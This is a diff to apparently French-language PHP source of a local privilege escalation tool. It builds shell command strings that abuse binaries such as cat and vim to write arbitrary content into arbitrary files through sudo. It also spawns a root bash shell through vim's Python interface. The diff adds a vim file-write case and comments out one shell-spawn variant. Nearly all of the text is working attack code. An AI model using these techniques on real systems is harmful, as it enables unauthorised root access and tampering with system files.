@@ -1834,11 +1834,16 @@ L’espace noyau allant de 0xC0000000 à 0xFFFFFFFF ");
 
 	            
 	        case "cat":
-	            $data = "echo '$write2what' | $via_sudo $this->file_path >> $write2where";
+	            $data = "echo '$write2what' | $this->file_path >> $write2where";
 	            $data_sudo = "echo '$write2what' | $via_sudo $this->file_path >> $write2where";
 	            break ;
 	            
+	        case "vim":
+	        case "vim.basic":
+	            $data = "echo '$write2what' | $this->file_path $write2where ";
+	            $data_sudo = "echo '$write2what' | $via_sudo $this->file_path $write2where ";
 
+	            break ;
 	            
 	    }
 	    
@@ -2834,9 +2839,9 @@ sh X sh X $cmd ";
 	                $data = "$this->file_path -c \":! $via_suid -c '$cmd'\" ";
 	                $data_sudo = "$via_sudo $data";	 
 	                
-	                $data = "$this->file_path -c ':py3 import os; os.execl(\"/bin/bash\", \"bash\", \"-c\", \"reset; exec ".addslashes($via_sudo)." $via_suid -c '$cmd'\")'";
-	                $data = "$this->file_path -c ':py3 import os; os.execl(\"/bin/bash\", \"bash\", \"-c\", \"reset; exec $via_sudo $via_suid -c '$cmd'\")'";
-	                $data_sudo = "$via_sudo $data";	                
+	                //$data = "$this->file_path -c ':py3 import os; os.execl(\"/bin/bash\", \"bash\", \"-c\", \"reset; exec ".addslashes($via_sudo)." $via_suid -c '$cmd'\")'";
+	                //$data = "$this->file_path -c ':py3 import os; os.execl(\"/bin/bash\", \"bash\", \"-c\", \"reset; exec $via_sudo $via_suid -c '$cmd'\")'";
+	                //$data_sudo = "$via_sudo $data";	                
 	                break ;
 	                
 	            case "watch":
